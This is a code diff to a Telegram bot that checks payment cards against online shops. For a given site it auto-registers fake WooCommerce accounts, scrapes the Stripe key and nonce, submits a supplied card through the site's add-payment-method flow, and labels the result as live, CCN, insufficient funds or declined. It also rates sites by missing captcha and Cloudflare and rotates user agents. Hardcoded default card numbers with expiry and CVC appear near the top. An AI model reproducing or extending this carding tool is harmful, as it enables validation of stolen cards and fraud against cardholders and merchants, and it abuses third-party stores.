@@ -5,13 +5,19 @@ import string
 import re
 import html
 import time
-from fake_useragent import UserAgent
+from user_agents import get_random_user_agent
 from telegram import Update
 from telegram.constants import ParseMode
 from telegram.ext import Application, CommandHandler, ContextTypes
 from config import CHANNEL_ID
+from bs4 import BeautifulSoup
+try:
+    from fake_useragent import UserAgent  # type: ignore
+except Exception:  # pragma: no cover - fallback when library unavailable
+    UserAgent = None  # type: ignore
+
 # --- CONFIG (no Telegram token needed) ---
-DEFAULT_CARD = "4848100094874662|08|2029|337"
+DEFAULT_CARD = "5598880397218308|06|2027|740"
 
 # ----------------
 
@@ -19,6 +25,28 @@ logging.basicConfig(
     format='%(asctime)s - %(name)s - %(levelname)s - %(message)s', level=logging.INFO
 )
 logger = logging.getLogger(__name__)
+
+if UserAgent is not None:
+    try:
+        _UA_PROVIDER = UserAgent()
+    except Exception:
+        _UA_PROVIDER = None
+else:  # pragma: no cover
+    _UA_PROVIDER = None
+
+
+def get_user_agent() -> str:
+    """
+    Return a randomized User-Agent string. Prefer fake_useragent when available,
+    fallback to local curated list via get_random_user_agent().
+    """
+    if _UA_PROVIDER is not None:
+        try:
+            return _UA_PROVIDER.random
+        except Exception:
+            logger.debug("fake_useragent failed, falling back to local list.")
+    return get_random_user_agent()
+
 
 def html_escape(text: str) -> str:
     return html.escape(text) if text else ""
@@ -35,9 +63,27 @@ def generate_random_username() -> str:
 # --- Replace or add these functions in sitechk.py ---
 
 def get_base_url(user_url: str) -> str:
+    """
+    Normalize arbitrary user-provided text to a clean https://domain.tld base URL.
+    Handles messy inputs like "Live > www.site.com text" by extracting first domain-like token.
+    """
     from urllib.parse import urlparse, urlunparse
-    parsed = urlparse(user_url if user_url.startswith(("http://", "https://")) else "https://" + user_url)
-    return urlunparse((parsed.scheme, parsed.netloc, '', '', '', ''))
+
+    if not user_url:
+        return ""
+
+    candidate = user_url.strip()
+    # Extract first domain-like token (handles leading words/numbers/symbols)
+    match = re.search(r'([a-z0-9-]+\.[a-z]{2,}(?:\.[a-z]{2,})?)', candidate.lower())
+    if not match:
+        return ""
+
+    domain = match.group(1)
+    if not domain.startswith(("http://", "https://")):
+        domain = "https://" + domain
+
+    parsed = urlparse(domain)
+    return urlunparse((parsed.scheme, parsed.netloc, "", "", "", ""))
 
 
 def analyze_site_page(text: str) -> dict:
@@ -48,9 +94,25 @@ def analyze_site_page(text: str) -> dict:
     """
     low = text.lower()
     gateways = []
-    for gw in ("stripe", "paypal", "ppcp","square", "braintree", "adyen", "paystack", "razorpay", "2checkout"):
-        if gw in low:
-            gateways.append(gw.capitalize())
+    gateway_keywords = {
+        "stripe": "Stripe",
+        "paypal": "PayPal",
+        "ppcp": "PPCP",
+        "square": "Square",
+        "braintree": "Braintree",
+        "adyen": "Adyen",
+        "paystack": "Paystack",
+        "razorpay": "Razorpay",
+        "2checkout": "2Checkout",
+        "authorize.net": "Authorize.net",
+        "worldpay": "WorldPay",
+        "klarna": "Klarna",
+        "afterpay": "AfterPay",
+    }
+
+    for key, label in gateway_keywords.items():
+        if key in low:
+            gateways.append(label)
 
     has_captcha = any(k in low for k in ("recaptcha", "g-recaptcha", "h-captcha", "captcha"))
     # Cloudflare detection: page title or body often contains "Attention Required!" or "Checking your browser"
@@ -64,35 +126,48 @@ def analyze_site_page(text: str) -> dict:
         "has_cloudflare": has_cloudflare,
         "has_add_to_cart": has_add_to_cart,
     }
+
+
+from bs4 import BeautifulSoup  # ← ADD THIS import
+
 def register_new_account(register_url: str, session: requests.Session = None):
     """
-    Registers a random account on the WooCommerce site.
-    Returns a requests.Session with cookies if successful, or None if failed.
+    Simple and reliable account registration - matches the accurate reference implementation.
+    Posts email, username, and password directly without complex nonce extraction.
     """
     sess = session or requests.Session()
+    
+    # Use UserAgent if available, otherwise fallback to get_user_agent()
+    if _UA_PROVIDER is not None:
+        try:
+            ua = _UA_PROVIDER.random
+        except Exception:
+            ua = get_user_agent()
+    else:
+        ua = get_user_agent()
+    
     headers = {
-        "User-Agent": UserAgent().random,
+        "User-Agent": ua,
         "Referer": register_url,
-        "Content-Type": "application/x-www-form-urlencoded"
+        "Content-Type": "application/x-www-form-urlencoded",
     }
-
+    
     data = {
         "email": generate_random_email(),
         "username": generate_random_username(),
-        "password": generate_random_string(12)
+        "password": generate_random_string(12),
     }
 
     try:
         resp = sess.post(register_url, headers=headers, data=data, timeout=15, allow_redirects=True)
+        # ✅ Simple check: if status is 200 or 302, registration likely succeeded
         if resp.status_code in (200, 302):
-            logger.info(f"[+] Registered new account: {data['email']} | {data['username']}")
             return sess
-        else:
-            logger.warning(f"[!] Registration failed ({resp.status_code}): {resp.text[:300]}")
-            return None
-    except Exception as e:
-        logger.error(f"Exception during registration: {e}")
         return None
+    except Exception:
+        return None
+
+
 
 
 def find_pk(payment_url: str, session: requests.Session = None) -> str | None:
@@ -103,7 +178,7 @@ def find_pk(payment_url: str, session: requests.Session = None) -> str | None:
     """
     sess = session or requests.Session()
     try:
-        headers = {"User-Agent": UserAgent().random}
+        headers = {"User-Agent": get_user_agent()}
         resp = sess.get(payment_url, headers=headers, timeout=15)
         text = resp.text
     except Exception as e:
@@ -241,92 +316,177 @@ def interpret_gate_response(final_json: dict) -> tuple[str, str]:
 
 
 
-# Modified send_card_to_stripe to return both raw JSON and the interpreted status
-def send_card_to_stripe(session: requests.Session, pk: str, card: str):
+def send_card_to_stripe(session: requests.Session, pk: str, card: str) -> dict:
     """
-    Core gate logic — adapted from gatet.Tele but parameterized to accept pk and session.
-    Returns the final JSON from the site's create_and_confirm_setup_intent (the gate response).
+    Stripe interaction + site confirmation flow copied from the working reference bot.
+    Returns a normalized dict containing status, message, and raw payload.
     """
     try:
         n, mm, yy, cvc = card.strip().split("|")
     except Exception:
-        return {"error": "Invalid card format. Expected: number|mm|yyyy|cvc"}
+        return {"error": "Invalid card format"}
 
     if yy.startswith("20"):
         yy = yy[2:]
 
-    headers = {"User-Agent": UserAgent().random, "Referer": ""}  # referer set later when known
-
-    # 1) Create payment method on Stripe
-    stripe_payload = {
+    headers = {"User-Agent": get_user_agent()}
+    payload = {
         "type": "card",
         "card[number]": n,
         "card[cvc]": cvc,
         "card[exp_year]": yy,
         "card[exp_month]": mm,
         "key": pk,
-        "_stripe_version": "2024-06-20"
+        "_stripe_version": "2024-06-20",
     }
-    logger.debug("[DEBUG] Sending card data to Stripe API")
-    resp = session.post("https://api.stripe.com/v1/payment_methods", data=stripe_payload, headers=headers, timeout=15)
+
+    stripe_json = {}
     try:
+        resp = session.post(
+            "https://api.stripe.com/v1/payment_methods",
+            data=payload,
+            headers=headers,
+            timeout=15,
+        )
         stripe_json = resp.json()
-    except Exception as e:
-        logger.error(f"[DEBUG ERROR] Stripe response not JSON: {e} / {resp.text[:300]}")
-        return {"error": "Stripe response not JSON", "raw": resp.text[:800]}
+        if isinstance(stripe_json, dict) and stripe_json.get("error"):
+            msg = stripe_json["error"].get("message", "Stripe decline")
+            return {
+                "status_key": "declined",
+                "short_msg": f"Card declined ({msg})",
+                "error_source": "stripe",
+                "raw": stripe_json,
+            }
+    except Exception as exc:
+        return {"error_source": "stripe", "short_msg": f"Stripe error ({exc})"}
 
-    stripe_id = stripe_json.get("id")
+    if resp.status_code >= 400:
+        return {
+            "error_source": "stripe",
+            "short_msg": f"Stripe error ({resp.status_code})",
+        }
+
+    stripe_id = stripe_json.get("id") if isinstance(stripe_json, dict) else None
     if not stripe_id:
-        # include the stripe response to help classify the failure
-        return {"error": "Failed to retrieve Stripe payment_method ID", "stripe_resp": stripe_json}
+        text_blob = str(stripe_json).lower()
+        if "succeeded" in text_blob or "status" in text_blob:
+            return {
+                "status_key": "success",
+                "short_msg": "Card added (detected via status)",
+                "error_source": "normal",
+                "raw": stripe_json,
+            }
+        return {
+            "error_source": "stripe",
+            "short_msg": "Stripe error (no id or invalid key)",
+            "raw": stripe_json,
+        }
 
-    # 2) Get nonce from payment page (must fetch full payment_url page so referer and cookies align)
-    logger.debug("[DEBUG] Retrieving nonce from payment page HTML")
+    if not hasattr(session, "payment_page_url"):
+        return {
+            "error_source": "site",
+            "short_msg": "Session missing payment_page_url",
+        }
+
     try:
-        html_text = session.get(session.payment_page_url, headers={"User-Agent": UserAgent().random}, timeout=15).text
-    except Exception as e:
-        return {"error": "Failed to fetch payment page for nonce", "raw": str(e)}
+        html_text = session.get(
+            session.payment_page_url,
+            headers={"User-Agent": get_user_agent()},
+            timeout=15,
+        ).text
+    except Exception as exc:
+        return {"error_source": "site", "short_msg": f"Site error (fetch page: {exc})"}
 
-    # Try several nonce patterns
     nonce = None
-    for pattern in (r'createAndConfirmSetupIntentNonce":"([^"]+)"', r'"_ajax_nonce":"([^"]+)"', r'nonce":"([^"]+)"'):
-        m = re.search(pattern, html_text)
-        if m:
-            nonce = m.group(1)
+    for pat in (
+        r'createAndConfirmSetupIntentNonce":"([^"]+)"',
+        r'"_ajax_nonce":"([^"]+)"',
+        r'nonce":"([^"]+)"',
+    ):
+        match = re.search(pat, html_text)
+        if match:
+            nonce = match.group(1)
             break
+
     if not nonce:
-        logger.error("[DEBUG ERROR] Nonce not found in payment page")
-        return {"error": "Nonce not found on payment page", "sample_html": html_text[:1000]}
+        return {"error_source": "site", "short_msg": "Site error (nonce missing)"}
 
-    # 3) Build final request to create and confirm setup intent for this site
     data_final = {
-        'action': 'create_and_confirm_setup_intent',
-        'wc-stripe-payment-method': stripe_id,
-        'wc-stripe-payment-type': 'card',
-        '_ajax_nonce': nonce,
+        "action": "create_and_confirm_setup_intent",
+        "wc-stripe-payment-method": stripe_id,
+        "wc-stripe-payment-type": "card",
+        "_ajax_nonce": nonce,
     }
-
-    payment_intent_url = session.payment_page_url.replace('/add-payment-method/', '/?wc-ajax=wc_stripe_create_and_confirm_setup_intent')
-    logger.debug(f"[DEBUG] Sending final request to {payment_intent_url}")
-    final_resp = session.post(payment_intent_url, headers={"User-Agent": UserAgent().random, "Referer": session.payment_page_url}, data=data_final, timeout=25)
+    final_url = (
+        session.payment_page_url.rstrip("/")
+        + "/?wc-ajax=wc_stripe_create_and_confirm_setup_intent"
+    )
+    headers["Referer"] = session.payment_page_url
 
     try:
+        final_resp = session.post(
+            final_url,
+            headers=headers,
+            data=data_final,
+            timeout=25,
+        )
         final_json = final_resp.json()
-    except Exception:
-        logger.error(f"[DEBUG ERROR] Final response not JSON: {final_resp.text[:500]}")
-        return {"error": "Final response not JSON", "raw": final_resp.text[:800]}
+    except Exception as exc:
+        return {"error_source": "site", "short_msg": f"Site error (bad JSON): {exc}"}
 
-    logger.debug(f"[DEBUG] Final gate response: {final_json}")
-
-    # Interpret response into category + message
     status_key, short_msg = interpret_gate_response(final_json)
+    txt_dump = str(final_json).lower()
 
-    # Normalize structure returned so caller can format final message
+    nonsend_patterns = [
+        "your request used a real card while testing",
+        "test mode",
+        "no such paymentmethod",
+        "invalid",
+        "missing",
+        "requires_action",
+        "requires_confirmation",
+        "platform_api_key_expired",
+        "expired api key",
+    ]
+    if any(pat in txt_dump for pat in nonsend_patterns):
+        return {
+            "status_key": "declined",
+            "short_msg": "Card declined (test/error)",
+            "error_source": "stripe" if "stripe" in txt_dump else "site",
+            "raw": final_json,
+        }
+
+    if (
+        isinstance(final_json, dict)
+        and (
+            final_json.get("success") is True
+            or final_json.get("data", {}).get("status", "").lower() == "succeeded"
+            or '"success": true' in txt_dump
+            or '"status": "succeeded"' in txt_dump
+        )
+        and "test" not in txt_dump
+        and "sandbox" not in txt_dump
+    ):
+        return {
+            "status_key": "success",
+            "short_msg": "Card added (live site)",
+            "error_source": "normal",
+            "raw": final_json,
+        }
+
+    if "your card was declined." in txt_dump:
+        return {
+            "status_key": "declined",
+            "short_msg": "Card declined",
+            "error_source": "stripe",
+            "raw": final_json,
+        }
+
     return {
+        "status_key": status_key or "declined",
+        "short_msg": short_msg or "Card declined (unrecognized)",
+        "error_source": "stripe" if "stripe" in txt_dump else "site",
         "raw": final_json,
-        "status_key": status_key,
-        "short_msg": short_msg,
-        "stripe_payment_method": stripe_id,
     }
 
 
@@ -338,6 +498,12 @@ async def check_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
 
     site_input = context.args[0].rstrip("/")
     base = get_base_url(site_input)
+    if not base:
+        await update.message.reply_text("❌ Invalid site URL provided.", parse_mode=ParseMode.HTML)
+        return
+
+    register_url = f"{base}/my-account/"
+    payment_url = f"{base}/my-account/add-payment-method/"
     card = context.args[1] if len(context.args) > 1 else DEFAULT_CARD
 
     # 🧭 Start the single editable message
@@ -349,7 +515,7 @@ async def check_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
     try:
         # Step 1: Check if site reachable
         start_time = time.time()
-        r = requests.get(base, headers={"User-Agent": UserAgent().random}, timeout=15)
+        r = requests.get(base, headers={"User-Agent": get_user_agent()}, timeout=15)
         response_time = time.time() - start_time
         if r.status_code >= 400:
             await progress_msg.edit_text(f"❌ Failed fetching {html_escape(base)} (status {r.status_code})", parse_mode=ParseMode.HTML)
@@ -358,20 +524,24 @@ async def check_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
         await progress_msg.edit_text(f"✅ Site reachable ({response_time:.2f}s)\nAnalyzing...", parse_mode=ParseMode.HTML)
 
         # Step 2: Register account
-        session = register_new_account(base + "/my-account/")
+        session = register_new_account(register_url)
         if not session:
             await progress_msg.edit_text("❌ Account registration failed.", parse_mode=ParseMode.HTML)
             return
-        session.payment_page_url = base + "/my-account/add-payment-method/"
+        session.payment_page_url = payment_url
 
         # Step 3: Fetch payment page
-        await progress_msg.edit_text(" Payment gateways...", parse_mode=ParseMode.HTML)
-        page_html = session.get(session.payment_page_url, headers={"User-Agent": UserAgent().random}, timeout=15).text
+        await progress_msg.edit_text("📦 Checking payment page...", parse_mode=ParseMode.HTML)
+        page_html = session.get(
+            payment_url,
+            headers={"User-Agent": get_user_agent()},
+            timeout=15,
+        ).text
         page_info = analyze_site_page(page_html)
 
         # Step 4: Find PK
         await progress_msg.edit_text("🔑 Searching for Stripe PK...", parse_mode=ParseMode.HTML)
-        pk_raw = find_pk(session.payment_page_url, session)
+        pk_raw = find_pk(payment_url, session)
         if not pk_raw:
             await progress_msg.edit_text("❌ PK not found.", parse_mode=ParseMode.HTML)
             return
@@ -382,19 +552,23 @@ async def check_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
 
         # Step 6: Interpret result
         status_key = result.get("status_key", "unknown")
-        short_msg = result.get("short_msg", "")
-        raw_snip = html_escape(str(result.get("raw", ""))[:800])
+        short_msg = result.get("short_msg") or result.get("error") or "No response"
+        raw_payload = result.get("raw", result)
+        raw_snip = html_escape(str(raw_payload)[:800])
 
         status_label = {
-            "success": "✅ Card added",
-            "cvc_incorrect": "⚠️ Incorrect CVC",
-            "3ds": "⚠️ 3DS required",
-            "not_supported": "⛔ Not supported",
-        }.get(status_key, "❌ Card declined")
+            "success": "✅ CARD ADDED",
+            "declined": "❌ DECLINED",
+            "cvc_incorrect": "⚠️ CCN",
+            "3ds": "⚠️ 3DS REQUIRED",
+            "not_supported": "⛔ NOT SUPPORTED",
+            "insufficient_funds": "⚠️ INSUFFICIENT FUNDS",
+            "unknown": "ℹ️ UNKNOWN",
+        }.get(status_key, "❌ DECLINED")
 
         gateway = ", ".join(page_info["gateways"]) if page_info["gateways"] else "Unknown"
-        captcha = "Found❌" if page_info["has_captcha"] else "Good site✅"
-        cloudflare = "Found❌" if page_info["has_cloudflare"] else "Good site✅"
+        captcha = "Found❌" if page_info["has_captcha"] else "Good✅"
+        cloudflare = "Found❌" if page_info["has_cloudflare"] else "Good✅"
         add_to_cart = "Yes" if page_info["has_add_to_cart"] else "No"
 
         # Step 7: Final unified message
@@ -405,7 +579,8 @@ async def check_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
             f"<b>Cloudflare:</b> {cloudflare}\n"
             f"<b>Add to cart:</b> {add_to_cart}\n"
             f"<b>PK:</b> <code>{html_escape(pk_raw)}</code>\n\n"
-            f"<b>Site response:</b> {short_msg}\n"
+            f"<b>Result:</b> {html_escape(status_label)}\n"
+            f"<b>Details:</b> {html_escape(short_msg)}\n"
             f"<code>{raw_snip}</code>"
         )
         # ✅ Edit the final message for the user
@@ -454,3 +629,4 @@ async def check_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
             f"❌ Error: {html_escape(str(e))}",
             parse_mode=ParseMode.HTML
         )
+
